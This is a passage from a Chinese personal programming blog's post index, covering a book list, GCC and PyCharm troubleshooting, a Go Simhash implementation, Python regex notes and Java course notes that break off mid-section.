O\u0026rsquo;Hallaron\n⭐⭐⭐⭐⭐\n神书就不多说了，多读几遍题目要做！\n《现代操作系统（第3版）》\n作者：Andrew S·Tanenbaum\n《编译原理》\n作者：Alfred V. Aho/Monica S.Lam/Ravi Sethi/Jeffrey D. Ullman\n第二版，又叫紫龙书~\n《计算机网络-自顶向下方法（第7版）》\n作者：James F.Kurose/Keith W.Ross\n《编码》\n作者：Charles Petzold\n《剑指Offer》\n作者：何海涛\n哈？我忘了当时为啥买了这本~\n语言类 这个分类中大部分是在初学一门新语言时的入门书籍，部分有深入去讲的\n《C Primer Plus（第6版）中文版》\n作者：Stephen Prata\ndbq没看几眼垫显示器了\u0026hellip;\n《C++ Primer Plus（第6版）中文版》\n作者：Stephen Prata\n众所周知，一本书垫显示器肯定是不够高的\u0026hellip;\n《Python编程从入门到实践》\n作者：埃里克·马瑟斯\n⭐⭐⭐⭐⭐\n这本书我觉得入门最好不过了~\n《Python网络数据采集》\n作者：米切尔\n⭐⭐⭐\n《利用Python进行数据分析》\n作者：Wes McKinney\n《流畅的Python》\n作者：Luciano Ramalho\n⭐⭐⭐⭐⭐\n最近正在看，很不错~\n《Python 3网络爬虫开发实战》\n作者：崔庆才\n⭐⭐⭐⭐\n这本感觉比《Python网络数据采集》讲的细致且清楚，适合刚开始学爬虫的~也是同老师的🎁~\n《Go程序设计语言》\n作者：艾伦 A. A. 多诺万\n⭐⭐⭐⭐\n《SQL基础教程》\n作者：MICK\n⭐⭐⭐⭐\n学校里SQL刚开始讲的偏向理论，配合这本偏向操作的书很好~\n《Head First Java（第二版·中文版）》\n作者：Kathy Sierra,Bert Bates著/杨尊一 编译 张然等 改编\n⭐⭐⭐⭐\n国外的好多教材的讲述思路与国内的差别好大，当时读这本书就感觉很明显\u0026hellip;很多翻译的书在让你上手时边给你讲偏原理的东西，也就是它是如何工作的；而我们平时见的大多是相对表面，也就是怎么用~当然各有优点~然后就是因为显示器还有点矮\u0026hellip;\n区块链 这个方向的口碑很好的书暂时不太多~\n《区块链开发实战》\n作者：吴寿鹤 冯翔等\n⭐⭐⭐⭐\n《以太坊技术详解与实战》\n作者：闫莺/郑凯/郭众鑫\n⭐⭐⭐\n《区块链原理、设计与应用》\n作者：杨保华/陈昌\n《区块链技术进阶与实战》\n作者：蔡亮/李启雷/梁秀波\n机器学习 emmmm目前看不太懂，数学真的跟不上~不过挺有趣的~\n《机器学习》\n作者：周志华\n⭐⭐⭐⭐⭐\nLinux 对于我这种菜Linux下开发有.不是很顺畅，昨天项目环境转到Win下又出了些小问题，不过感觉好多了~Linux内核emmmmm给我冲~\n《鸟哥的Linux私房菜》\n作者：鸟哥\n《深入理解LINUX内核(第三版)》\n作者：博韦 西斯特\n快开学了，又想买书了，买了都给我看！！！ ","date":"2019-08-16T22:08:30+08:00","permalink":"https://lizonglingo.github.io/p/%E4%B9%A6%E5%8D%95/","title":"书单"},{"content":" 最近正在做的一个项目要在Linux环境下迁移到Windows下进行继续的开发， 结果在Windows下尝试对项目进行编译时出了问题。\n问题描述 由于项目中有使用到jieba库的Golang版本，而这个版本的构建中有使用到C++。因此在编译过程中有对gcc的依赖。然而，在编译的过程中，报出来这样的错误：\n解决思路 在查询这些报错时（英语不好很多没看懂），一条回答的意思大概是GCC8这个版本后，对一些什么东西加强了检查。换句话说就是更严格了，这就导致有些代码用旧版本GCC编译后不会产生错误，而使用新的版本就有可能会出现错误。\n所以我看了本机的GCC环境：\n怪不得，version 8.1.0；接着我又去看了原来的开发环境Ubuntu的GCC版本：\nversion 7.4.0，看来应该就是这里出现了问题。\n之后，我重新找了老版本的MinGW重新下了个GCC，捯饬半天，终于可以了：\nps:图床突然挂了我贴那个编译成功的代码吧\u0026hellip;\n把GCC降到version 4.8.2（其实是我随便找的版本，版本在8之前的应该都OK）后，再次编译：\nD:\\Goland\\Gowork\\BlockChain\\bitcoin_part6\\src\\coin\u0026gt;go build main.go D:\\Goland\\Gowork\\BlockChain\\bitcoin_part6\\src\\coin\u0026gt; 就不会有错误啦！\nReferences MinGW旧版本下载：\n[https://sourceforge.net/projects/mingw-w64/files/Toolchains%20targetting%20Win64/Personal%20Builds/mingw-builds/4.8.2/threads-posix/seh/x86_64-4.8.2-release-posix-seh-rt_v3-rev2.7z/download](https://sourceforge.net/projects/mingw-w64/files/Toolchains targetting Win64/Personal Builds/mingw-builds/4.8.2/threads-posix/seh/x86_64-4.8.2-release-posix-seh-rt_v3-rev2.7z/download)\n问题：\nhttps://github.com/ziglang/zig/issues/1357\nhttps://github.com/fantasticfears/cppjieba_rb/issues/2\n","date":"2019-08-16T09:29:26+08:00","permalink":"https://lizonglingo.github.io/p/%E8%A7%A3%E5%86%B3win%E4%B8%8B%E4%BD%BF%E7%94%A8gojieba%E7%BC%96%E8%AF%91%E6%97%B6%E7%9A%84gcc%E6%8A%A5%E9%94%99/","title":"解决win下使用gojieba编译时的gcc报错"},{"content":" Simhash来自于Google Moses Charikar发表的一篇论文 “detecting near-duplicates for web crawling” 中提出了simhash算法，专门用来解决海量数据的去重任务。这个算法通过将一个文档转化为一个64位的二进制特征串，然后比较两个文档的特征串，如果这两个文档的特征串的海明距离小于某个值（一般来讲这个值为3），则说明这是相似文档。\nSimhash原理 Simhash算法是局部敏感哈希的一种，其主要思想是将高维特征向量降维成低维的特征向量，通过比较两个向量的Hamming Distance来确定文章的相似度。所以Simhash算法就是通过比较两个Hamming Distance，以获取相似度，如果这个相似度小于某个规定的值，就说明这两个文本相似。\n对于文本信息，我们需要对其作如下处理：\n文本分词\n首先我们需要对文本进行分词处理，也就是将文本的所包含的关键词提取出来，这部分我们可以使用目前常见的中文分词库来进行处理。这样我们就得到了一些关键词。\n给关键词赋权\n第二步需要根据权重给不同的关键词赋予权值。关于关键词的权重目前有很多种不同的计算方式，简单一些的比如根据关键词在文中出现的次数赋予权值，比较复杂但是更能体现实际意义的比如：TD-IDF算法、TextRank算法等等。目前所见的比较流行的分词工具都带有计算关键词权重的方法，所以在我们这个简单的实现中，这一步就用分词工具进行处理。这样我们获得了关键词以及其对应的权重。\n对每个关键词进行hash运算\n第三步我们对每个关键词进行hash运算，通常我们使用64位hash。这里我们为了方便用8位hash举例。 比如：\n假设 “上海” 的hash值为：01011001\n假设 “北京” 的hash值为：11001011\n\u0026hellip;\u0026hellip;\n这样我们对每个关键词都得到了它们各自的hash。\n对hash值加权处理\n第四步加权处理所遵循的原则就是：如果某位是0，这位就变成 -Weight，反之这位就变成 Weight。\n比如：\n“上海” 的权值为：45.11\n那么“上海”的特征向量就变为：-45.11 45.11 -45.11 45.11 45.11 -45.11 -45.11 45.11\n“北京” 的权值为：32.09\n那么“北京”的特征向量就变为：32.09 32.09 -32.09 -32.09 32.09 -32.09 32.09 32.09\n\u0026hellip;\u0026hellip;\n对所用关键词的权值进行求和\n第五步就是对所有关键字的特征向量的每一位的值分别求和，比如：\n以两个关键词为例（“上海”、“北京”）：-13.02 77.20 -77.20 13.02 77.20 -77.20 -13.02 77.20\n转化为二进制\n第六步，将最后的求和结果大于零位记录为1，小于零的记录为0，以上述为例：01011001\n01011001就是这个文本的特征hash\n计算hamming distance\n我们假设两个文本的特征hash分别为：\n00101110\n00001111\n它们的海明距离为2，我们就可以说这两个文章是相似的。\nGolang代码实现 使用了一个Github的开源项目，里面的simhash是32位的，我们只是将其改成64位，只改动了一小点地方。\n本次代码实现我们使用了几个开源项目：\nNETkiddy/simhash_similarity\nyanyiwu/gojieba\n第一个为golang实现的simhash的项目，一个为jieba分词库的golang版本。下面是代码：\npackage main import ( \u0026#34;fmt\u0026#34; \u0026#34;hash/fnv\u0026#34; \u0026#34;simhash_similarity_jieba\u0026#34; \u0026#34;strings\u0026#34; ) type WordWeight struct { Word string Weight float64 } func main() { g := simhash.NewGoJieba() srcStr := \u0026#34;已成为当前信息领域的一个新的研究热点 . 共识算法是区块链系统的关键要素之一 , 本文对目前已经提出的 32 种主流区块链共识算法进行了系统性的梳理与分析 . 需要说明的是 , 由于近年来共识算法研究发展较快 , 本文讨论的识算法可能仅为实际共识算法的一个子集 , 尚存在若干新兴或者小众的共识算法未加以讨论 , 同时一些较新的共识算法仍在不断试错和优化阶段 . 本文工作可望为后续的研究与应用提供有益的启发与借鉴 .以目前的研究现状而言区块链共识算法的未来研究趋势将主要侧重于区块链共识算法性评估、共识算法 – 激励机制的适配优化以及新型区块链结构下的共识创新三个方面 .首先 , 区块链共识算法在经历过一段百花齐放式的探索和创新之后 , 势必会趋向于收敛到新共识算法的性能评估和标准化方面的研究 . 目前 , 共识算法的评价指标各异 , 但一般均侧重于社会学角度的公平性和去中心化程度 , 经济学角度的能耗、成本与参与者的激励相容性以及计算机科学角度的可扩展性 ( 交易吞吐量、节点可扩展等 ) 、容错性和安全性等 . 如何结合具体需求和应用场景 自适应地实现针对特定性能评价目标的共识机制设计与算法优化 , 将是未来研究的热点之一 .其次 , 区块链的共识算法与激励机制是紧密耦合、不可分割的整体 , 同时二者互有侧重点 : 共识算法规定了矿工为维护区块链账本安全性、一致性和活性而必须遵守的行为规范和行动次序 ; 激励机制则规定了在共识过程中为鼓励矿工忠实、高效地验证区块链账本数据而发行的经济权益 , 通常包括代币发行机制、代币分配机制、交易费定价机制 [53] 等 .从研究角度来看 , 如果将区块链系统运作过程建模为矿工和矿池的大群体博弈过程 [54] 的话 , 那么共识算法将决定其博弈树的结构和形状、激励机制将决定矿工和矿池在博弈树中每个叶子结点的收益 . 因此 , 区块链共识算法和激励机制不仅各自存在独立优化的必要性 , 更为重要地是共识 – 激励二元耦合机制的联合优化、实现共识与激励的 “ 适配 ”, 这是解决区块链系统中不断涌现出的扣块攻击、自私挖矿等策略性行为、保障区块链系统健康稳定运行的关键问题 , 迫切需要未来研究的跟进 .最后 , 随着区块链技术的发展、特别是数据层的技术和底层拓扑结构的不断创新 , 目前已经涌现出若干新兴的区块 “ 链 ” 数据结构 , 例如有向无环图(Directed acyclic graph) 和哈希图 (HashGraph)等 . 这些新数据结构将以单一链条为基础的区块链技术的范畴展为基于图结构的区块 “ 链 ” 或分布式账本 . 例如适用于物联网支付场景的数字货币OTA 即采用称为 “Tangle ( 缠结 )” 的 DAG 拓扑结构 , 其共识过程以交易 ( 而非区块 ) 为粒度 , 每个交易都引证其他两个交易的合法性、形成 DAG 网络 ,因而可以实现无区块 (Blockless) 共识 ; HashGraph共识则更进一步 , 基于 Gossip of gossip 协议和虚拟投票等技术 , 以交易为粒度 , 在特定的 DAG 结构上2020自动实现公平和快速的拜占庭容错共识 . 这些新型区块\u0026#34; dstStr := \u0026#34;那么共识算法将决定其博弈树的结构和形状、激励机制将决定矿工和矿池在博弈树中每个叶子结点的收益 . 因此 , 区块链共识算法和激励机制不仅各自存在独立优化的必要性 , 更为重要地是共识 – 激励二元耦合机制的联合优化、实现共识与激励的 “ 适配 ”, 这是解决区块链系统中不断涌现出的扣块攻击、自私挖矿等策略性行为、保障区块链系统健康稳定运行的关键问题 , 迫切需要未来研究的跟进 .最后 , 随着区块链技术的发展、特别是数据层的技术和底层拓扑结构的不断创新 , 目前已经涌现出若干新兴的区块 “ 链 ” 数据结构 , 例如有向无环图(Directed acyclic graph) 和哈希图 (HashGraph)等 . 这些新数据结构将以单一链条为基础的区块链技术的范畴展为基于图结构的区块 “ 链 ” 或分布式账本 . 例如适用于物联网支付场景的数字货币OTA 即采用称为 “Tangle ( 缠结 )” 的 DAG 拓扑结构 , 其共识过程以交易 ( 而非区块 ) 为粒度 , 每个交易都引证其他两个交易的合法性、形成 DAG 网络 ,因而可以实现无区块 (Blockless) 共识 ; HashGraph共识则更进一步 , 基于 Gossip of gossip 协议和虚拟投票等技术 , 以交易为粒度 , 在特定的 DAG 结构上2020自动实现公平和快速的拜占庭容错共识 . 这些新型区块拓扑结构及其共识算法是未来发展趋势之一 , 建立在这些新型数据结构之上的共识算法也值得深入研究\u0026#34; // 第二个参数为分出关键词的个数 srcWordsWeight := g.C.ExtractWithWeight(srcStr, 22) dstWordsWeight := g.C.ExtractWithWeight(dstStr, 11) //fmt.Printf(\u0026#34;srcWordsWeight: %v\\n\u0026#34;, srcWordsWeight) //fmt.Printf(\u0026#34;dstWordsWeight: %v\\n\u0026#34;, dstWordsWeight) srcWords := make([]WordWeight, len(srcWordsWeight)) dstWords := make([]WordWeight, len(dstWordsWeight)) for i, ww := range srcWordsWeight { word := WordWeight{Word: ww.Word, Weight: ww.Weight} srcWords[i] = word } for i, ww := range dstWordsWeight { word := WordWeight{Word: ww.Word, Weight: ww.Weight} dstWords[i] = word } fmt.Printf(\u0026#34;srcWords\u0026amp;weight:%v\\n\u0026#34;, srcWords) fmt.Printf(\u0026#34;dstWords\u0026amp;weight:%v\\n\u0026#34;, dstWords) distance, err := SimHashSimilar64(srcWords, dstWords) if err != nil { fmt.Printf(\u0026#34;failed: %v\u0026#34;, err) } fmt.Printf(\u0026#34;SimHashSimilar distance: %v\u0026#34;, distance) } // 传入两个WordWeight类型的列表返回相似度值 func SimHashSimilar64(srcWordWeighs, dstWordWeights []WordWeight) (distance int, err error) { srcFingerPrint, err := simhashFingerPrint64(srcWordWeighs) if err != nil { return } fmt.Println(\u0026#34;srcFingerPrint: \u0026#34;, srcFingerPrint) dstFingerPrint, err := simhashFingerPrint64(dstWordWeights) if err != nil { return } fmt.Println(\u0026#34;dstFingerPrint: \u0026#34;, dstFingerPrint) distance = hammingDistance(srcFingerPrint, dstFingerPrint) return } // rewrite simhashFingerPrint // 使用64位hash指纹进行运算 func simhashFingerPrint64(wordWeights []WordWeight) (fingerPrint []string, err error) { // 使用64位创建64个元素的二进制权重 binaryWeights := make([]float64, 64) for _, ww := range wordWeights { bitHash := strHashBitCode64(ww.Word) weights := calcWithWeight64(bitHash, ww.Weight) //binary每个元素与weight的乘积结果数组 binaryWeights, err = sliceInnerPlus64(binaryWeights, weights)\t//对每个hash数组求和 //fmt.Printf(\u0026#34;ww.Word:%v, bitHash:%v, ww.Weight:%v, binaryWeights: %v\\n\u0026#34;, ww.Word,bitHash, ww.Weight, binaryWeights) if err != nil { return } } fingerPrint = make([]string, 0) // 将求和后的数组重新根据正负转化为2进制hash数组 for _, b := range binaryWeights { if b \u0026gt; 0 { // bit 1 fingerPrint = append(fingerPrint, \u0026#34;1\u0026#34;) } else { // bit 0 fingerPrint = append(fingerPrint, \u0026#34;0\u0026#34;) } } return } // rewrite strHashBitCoin 64bit // 返回一个64位的二进制字符串,也就是对这个关键字进行hash运算之后的hash字符串 func strHashBitCode64(str string) string { h := fnv.New64a() h.Write([]byte(str)) b := int64(h.Sum64()) return fmt.Sprintf(\u0026#34;%064b\u0026#34;, b) } // binary每个元素与weight的乘积结果数组,重写为64位操作 // 就是hash完关键字的64位二进制串上都变成 [ weight, -weight, -weight, ... ,weight]的形式 func calcWithWeight64(bitHash string, weight float64) []float64 { // 首先分割字符串 bitHashs := strings.Split(bitHash, \u0026#34;\u0026#34;) // 构造一个长度为0的slice,之后往里添加元素 binarys := make([]float64, 0) for _, bit := range bitHashs { if bit == \u0026#34;0\u0026#34; { // 根据simhash算法,如果这位上为0就乘以负的权值 binarys = append(binarys, float64(-1)*weight) } else { // 反正,这位为1就乘以正权值 binarys = append(binarys, float64(weight)) } } return binarys } // 对其每个求完权值并且进行完向量运算的64位hash特征串进行求和运算 // 假设arr2为第n个关键字,那么arr1就是前n-1个关键字每一位带权hash的和 func sliceInnerPlus64(arr1, arr2 [] float64) (dstArr []float64, err error) { dstArr = make([]float64, len(arr1), len(arr1)) if arr1 == nil || arr2 == nil { err = fmt.Errorf(\u0026#34;sliceInnerPlus array nil\u0026#34;) return } if len(arr1) != len(arr2) { err = fmt.Errorf(\u0026#34;sliceInnerPlus array Length NOT match, %v != %v\u0026#34;, len(arr1), len(arr2)) return } for i, v1 := range arr1 { dstArr[i] = v1 + arr2[i] } return } func hammingDistance(arr1, arr2 []string) int { count := 0 for i, v1 := range arr1 { if v1 != arr2[i] { count++ } } return count } 具体函数细节请移步GitHub源码~\n参考：\nhttp://yanyiwu.com/work/2014/01/30/simhash-shi-xian-xiang-jie.html\nhttps://wizardforcel.gitbooks.io/the-art-of-programming-by-july/content/06.03.html\n关于更多的中文分词信息可以点击这里\n关于Hamming Distance点击 -\u0026gt; 海明距离\n","date":"2019-07-23T21:21:02+08:00","permalink":"https://lizonglingo.github.io/p/golang%E5%AE%9E%E7%8E%B0%E5%9F%BA%E7%A1%80simhash%E7%AE%97%E6%B3%95/","title":"Golang实现基础Simhash算法"},{"content":" 贴一个自己认为比较不错的PythonGUI的入门中文教程，使用的是PyQt5，我目前也在用这个入门。\nPyQt5中文教程\n","date":"2019-07-15T19:13:31+08:00","permalink":"https://lizonglingo.github.io/p/pyqt5%E4%B8%AD%E6%96%87%E6%95%99%E7%A8%8B%E6%8E%A8%E8%8D%90/","title":"PyQt5中文教程推荐"},{"content":" 本篇主要介绍Python正则表达式的re库的基本使用方法。\n本篇主要内容的整理来自于：\nPython-re库的官方文档\nPython-0-100天正则表达式部分\n正则表达式30分钟入门\n什么是正则表达式 在编写处理字符串的程序或网页时，经常会有查找符合某些复杂规则的字符串的需要。正则表达式就是用于描述这些规则的工具。换句话说，正则表达式就是记录文本规则的代码。\n换句话说正则表达式是一种工具，它定义了字符串的匹配模式（如何检查一个字符串是否有跟某种模式匹配的部分或者从一个字符串中将与模式匹配的部分提取出来或者替换掉）。如果你在Windows操作系统中使用过文件查找并且在指定文件名时使用过通配符（*和?），那么正则表达式也是与之类似的用来进行文本匹配的工具，只不过比起通配符正则表达式更强大，它能更精确地描述你的需求（当然你付出的代价是书写一个正则表达式比打出一个通配符要复杂得多，要知道任何给你带来好处的东西都是有代价的，就如同学习一门编程语言一样），比如你可以编写一个正则表达式，用来查找所有以0开头，后面跟着2-3个数字，然后是一个连字号“-”，最后是7或8位数字的字符串（像028-12345678或0813-7654321），这不就是国内的座机号码吗。最初计算机是为了做数学运算而诞生的，处理的信息基本上都是数值，而今天我们在日常工作中处理的信息基本上都是文本数据，我们希望计算机能够识别和处理符合某些模式的文本，正则表达式就显得非常重要了。今天几乎所有的编程语言都提供了对正则表达式操作的支持，Python通过标准库中的re模块来支持正则表达式操作。\n我们可以考虑下面一个问题：我们从某个地方（可能是一个文本文件，也可能是网络上的一则新闻）获得了一个字符串，希望在字符串中找出手机号和座机号。当然我们可以设定手机号是11位的数字（注意并不是随机的11位数字，因为你没有见过“25012345678”这样的手机号吧）而座机号跟上一段中描述的模式相同，如果不使用正则表达式要完成这个任务就会很麻烦。\n正则表达式中的基本符号扼要总结 匹配类型 符号 解释 示例 说明 . 匹配任意字符 b.t 可以匹配bat/but/b#t/b2t等 \\w 匹配字母/数字/下划线 b\\wt 可以匹配bat/but/b_t等 但是不能匹配b#t \\s 匹配空白字符(包括\\t、\\n、\\r) love\\syou 可以匹配love you \\d 匹配数字 \\d\\d 可以匹配01/99/34/54等 \\b 匹配单词的边界 \\bThe\\b ^ 匹配字符串的开始 ^The 可以匹配The开头的字符串 $ 匹配字符串的结束 $.exe 可以匹配.exe结束的字符串 \\W 匹配非(字母/数字/下划线) b\\Wt 可以匹配b@t/b#t等 但是不能匹配b1t/but/b_t等 \\S 匹配非空白字符 love\\Syou 可以匹配love#you等 但是不能匹配love you \\D 匹配非数字 \\d\\D 可以匹配3#/5f/6^等 \\B 匹配非单词边界 \\Bio\\B 匹配次数及组合匹配 符号 解释 示例 说明 [] 匹配来自字符集的任意单一字符 [aeiou] 可以匹配任一元音字母字符 [^] 匹配不在字符集中的任意单一字符 [^aeiou] 可以匹配任一非元音字母字符 * 匹配0次或多次 \\w* + 匹配1次或多次 \\w+ ? 匹配0次或1次 \\w? {N} 匹配N次 \\w{3} {M,} 匹配至少M次 \\w{3,} {M,N} 匹配至少M次至多N次 \\w{3,6} (?#) 注释 (exp) 匹配exp并捕获到自动命名的组中 (? \u0026lt;name\u0026gt;exp) 匹配exp并捕获到名为name的组中 (?:exp) 匹配exp但是不捕获匹配的文本 (?=exp) 匹配exp前面的位置 \\b\\w+(?=ing) 可以匹配I\u0026rsquo;m dancing中的danc (?\u0026lt;=exp) 匹配exp后面的位置 (?\u0026lt;=\\bdanc)\\w+\\b 可以匹配I love dancing and reading中的第一个ing (?!exp) 匹配后面不是exp的位置 (?\u0026lt;!exp) 匹配前面不是exp的位置 *? 重复任意次，但尽可能少重复 a.*b a.*?b 将正则表达式应用于aabab，前者会匹配整个字符串aabab，后者会匹配aab和ab两个字符串 +? 重复1次或多次，但尽可能少重复 ?? 重复0次或1次，但尽可能少重复 {M,N}? 重复M到N次，但尽可能少重复 {M,}? 重复M次以上，但尽可能少重复 说明： 如果需要匹配的字符是正则表达式中的特殊字符，那么可以使用\\进行转义处理，例如想匹配小数点可以写成\\.就可以了，因为直接写.会匹配任意字符；同理，想匹配圆括号必须写成\\(和\\)，否则圆括号被视为正则表达式中的分组。\nPython对正则表达式的支持 Python提供了re模块来支持正则表达式相关操作，下面是re模块中的核心函数。\nre模块中的核心函数 函数 说明 complie(pattern, flags=0) 编译正则表达式返回正则表达式对象 match(pattern, string, flags=0) 用正则表达式匹配字符串 成功返回匹配对象 否则返回None search(pattern, string, flags=0) 搜索字符串中第一次出现正则表达式的模式 成功返回匹配对象 否则返回None split(pattern, repl, string, count=0, flags=0) 用正则表达式指定的模式分隔符拆分字符串 返回列表 sub(pattern, repl, string, count=0, flags=0) 用指定的字符串替换原字符串中与正则表达式匹配的模式 可以用count指定替换的次数 fullmatch(pattern, string, flags=0) match函数的完全匹配（从字符串开头到结尾）版本 findall(pattern, string, flags=0) 查找字符串所有与正则表达式匹配的模式 返回字符串的列表 finditer(pattern, string, flags=0) 查找字符串所有与正则表达式匹配的模式 返回一个迭代器 purge() 清除隐式编译的正则表达式的缓存 re.I / re.IGNORECASE 忽略大小写匹配标记 re.M / re.MULTILINE 多行匹配标记 说明： 上面提到的re模块中的这些函数，实际开发中也可以用正则表达式对象的方法替代对这些函数的使用，如果一个正则表达式需要重复的使用，那么先通过compile函数编译正则表达式并创建出正则表达式对象无疑是更为明智的选择。\n","date":"2019-07-15T19:13:31+08:00","permalink":"https://lizonglingo.github.io/p/python%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/","title":"Python中的正则表达式"},{"content":" 时隔半年之后（这半年很少用Pycharm\u0026hellip;），我终于在 stackoverflow 上找到了解决方案。\n原文： 原文链接\n回答者：Michael Cooper\n···\nI found the solution to the problem. Hopefully this will help someone else\u0026ndash;these problems can be sofrustrating to debug.\nThe problem was caused by third-party software that had added itself to the path and installed msvcr90.dll in its program folder. In this case, the problem was caused by Intel\u0026rsquo;s iCLS Client.\nSo\u0026hellip; How to find the problem in similar situations?\nDownload Process Explorer here. Start your application and reproduce runtime error R6034. Start Process Explorer. In the \u0026ldquo;View\u0026rdquo; menu go to \u0026ldquo;Lower Pane View\u0026rdquo; and choose \u0026ldquo;DLLs\u0026rdquo;. In the top pane, locate your application and click on it. The bottom pane should show a list of DLLS loaded for your application. Locate \u0026ldquo;msvcr??.dll\u0026rdquo; in the list. There should be several. Look for the one that is not in the \u0026ldquo;winsxs\u0026rdquo; folder, and make a note of it. Now, check the path just before your application runs. If it includes the folder you noted in step 5, you\u0026rsquo;ve probably found the culprit. How to fix the problem? You\u0026rsquo;ll have to remove the offending entry from the path before running your program. In my case, I don\u0026rsquo;t need anything else in the path, so I wrote a simple batch file that looks like this:\npath=\rmyprogram.exe That\u0026rsquo;s it. The batch file simply clears the path before my program runs, so that the conflicting runtime DLL is not found.\nHope this helps!\n···\n我使用Process Explorer找到报错的.dll文件的位置并且将其删除后，就没有再弹出错误警告。如果担心此做法会产生潜在的问题，那么可以将.dll文件移出当前文件夹先保存起来即可。\n关于本文有任何问题可以留言或者通过邮件等方式联系我。\n","date":"2019-06-21T20:06:06+08:00","permalink":"https://lizonglingo.github.io/p/%E8%A7%A3%E5%86%B3pycharm%E5%87%BA%E7%8E%B0runtime-error-r6034%E7%9A%84%E6%8A%A5%E9%94%99/","title":"解决Pycharm出现Runtime Error R6034的报错"},{"content":"第一章 Java开发入门 Java三个技术平台：JavaSE JavaEE JavaME\nJava语言的特点：\n简单易用 安全可靠 跨平台 面向对象 支持多线程 什么是JDK？\nJava开发环境叫JDK，包括Java编译器、Java运行环境、Java文档生成器、Java打包工具等\n什么是JRE？\nJava运行环境\n关于系统环境变量\nPATH：告知系统去指定路径寻找JDK\nCLASSPATH：告知JDK到指定路径去查找类（.class）文件\n关于 javac.exe \u0026amp; java.exe\n编译java源文件：\njavac helloworld.java（完整的文件名）\n之后生成：helloworld.class文件\n运行java程序：\njava helloworld（类名）\n第二章 Java编程基础 2.1 Java基本语法 标识符规范： 包名所有的字母一律小写 类名和接口名每个单词首字母都要大写 常量名所有字母都大写，单词之间用下划线连接 变量名和方法名第一个单词首字母都小写，从第二个单词开始首字母都大写 使用有意义的单词表示 2.2 变量的数据结构 基本数据类型，和引用数据类型。\n基本数据类型：\n数值型（整数类型[byte\tshort\tint\tlong]\t浮点类型[float\tdouble]）\n字符型 char\n布尔型 boolean\n引用数据类型：\n类（class） 接口（interface） 数组 枚举（enum） 注解（Annotation） 2.3 Java中的运算符 逻辑运算符 \u0026amp;\u0026amp;：短路与，当左边为false，右边就不会运算了 \u0026amp;：与，不论左边是true还是false，右边都会运算 ||：短路或，当左边为true的时候，右边就不会运算了 |：或，不论左边是true还是false，右边都会运算 运算符的优先级 ​\t.\t[]\t() ​ ++ \u0026ndash; ~ ! ​ * / % ​ + - ​ \u0026laquo; \u0026raquo; \u0026raquo;\u0026gt; ​ \u0026lt; \u0026gt; \u0026lt;= \u0026gt;= ​ == != ​ \u0026amp; ​ ^ ​ | ​ \u0026amp;\u0026amp; ​ || ​ ？： ​ = *= /= += -= \u0026laquo;= \u0026raquo;= \u0026raquo;\u0026gt;= \u0026amp;= ^= |= 2.4 选择结合语句 // if—else结构 if(...){ ... }else{ ... } // if—else if-else结构 if(...){ ... }else if(...){ }else if(...){ }else{ ... } // switch条件语句 switch(...){ case ...: ... break; case ...: ... break; case ...: ... break; default: ... break; } 2.5循环结构语句 循环语句 // while while(...){ ... } // do-while do{ ... }while(...); // for for(初始化表达式; 循环条件; 操作表达式){ ... } // 循环嵌套 for(...; ...; ...){ ... for(...; ...; ...){ ... } ... } 跳转语句 break：在switch-case中，终止某个case并且跳出switch结构\n​\t在循环语句中，跳出当前循环\nbreak跳出多层循环 outer: for(int i = 1; i \u0026lt;= 9; i++){ for(int j = 1; j \u0026lt;= i; j++){ if(i \u0026gt;= 3){ break outer;\t//直接跳出outer循环 } } } continue：在循环中，终止本次循环，执行下一次循环 2.6数组 数组定义 三种语法：\n数组类型[] 数组名 = new 数组类型 [数组长度]; 数组类型[] 数组名 = new 数组类型 []{e0, e1, e2, ...}; 数组类型[] 数组名 = {e0, e1, e2, ...} int[] ids = new int[100]; String[] name = new String[] {\u0026#34;张三\u0026#34;, \u0026#34;Tom\u0026#34;, ...}; Object[] object = {\u0026#34;张三\u0026#34;, \u0026#34;tom\u0026#34;, ...}; int[] ids; ids = new int[100]; 多维数组 int[][] arr = new int[3][4]; int[][] arr = new int[3][]; int[][] arr = {{1, 2},{3,4,5,6},{7,8,9}}; 基本操作 数组遍历\n数组求最值\n数组排序（冒泡）\n第三章 面向对象（上） 3.1面型对象概述 封装 继承 多态 3.2类与对象 类的定义 // 类的定义 [修饰符] class 类名 [extends 父类名] [implements 接口名]{ // 类成员及方法 } //类成员变量声明 [修饰符] 数据类型 变量名 [=值]; private String name; private int age = 20; // 类成员方法声明 [修饰符] [返回值类型] 方法名 (参数列表){ ... ... return 返回值; } 对象的创建与使用 类名 对象名称 = new 类名(); // 例如 class Person{ } Person p = new Person(); 访问控制符 private（当前类访问级别）：只能被该类的其他成员所访问，其他类无法直接访问 default（包访问级别）：如果一个类或者类的成员不使用任何访问控制修饰符，则成为默认访问级别，这个类或者类成员只能被本包中的其他类访问 protected（子类访问级别）：这个成员既可以被同一包下的其他类访问也能被不同包下该类的子类所访问 public（公共访问级别）：这个类和类成员可以被所有类所访问，不管是不是在同一个包中 3.3 类的封装 具体实现是：在定义一个类时，将类中的属性私有化，即使用private关键字来修饰，私有属性只能在它所在的类中被访问；如果外界想访问私有属性，需要提供一些使用public修饰的公有方法。\n3.4 方法的重载和递归 方法的重载 public class Example{ // 两个整数相加 public static int add(int x, int y){ return x+y; } // 三个整数相加 public static int add(int x, int y, int z){ return x+y+z; } // 两个小数相加 public static double(double x, double y){ return x+y; } } 方法的重载：\n方法名称相同 参数个数或者参数类型不同 与返回值无关 方法的递归 递归必须要有结束条件，否则会陷入无限递归状态\npublic class Example{ public static int getSum(int n){ if(n==1){ return 1; } int temp = getSum(n-1); return temp + n; } public static void main(String[] args){ int sum = getSum(4); } } 3.5构造方法 构造方法的定义 满足三个条件：\n方法名与类名相同 方法名前面没有返回值类型的声明 在方法中不能用return来返回一个值，但是可以单独的写return语句来作为方法的结束 [修饰符] 方法名 (参数列表){ ... } // 构造无参 class Person{ public Person(){ // 无参构造方法 } } Person p = new Person(); // 构造有参 class Person{ public Person(int a){ // 有参构造方法 } } Person p = new Person(18); 构造方法的重载 只要每个构造方法的参数类型和个数不同即可\nclass Person{ String name; int age; public Person(int a){ age = a; } public Person(String n, int a){ name = n; age = a; } } Person p1 = new Person(18); Person p2 = new Person(\u0026#34;张三\u0026#34;, 18); 注意： Java中每个类都至少有一个构造方法，如果在一个类中没有显示地定义构造方法，系统就会自动为这个类创建一个默认构造方法 一旦为该类定义构造方法，系统将不再提供默认的无参构造方法 3.6 this关键字 Java中提供了一个关键字this来指代当前对象，用于在方法中访问该类型的其他成员\n// this调用成员变量 class Person{ int age; 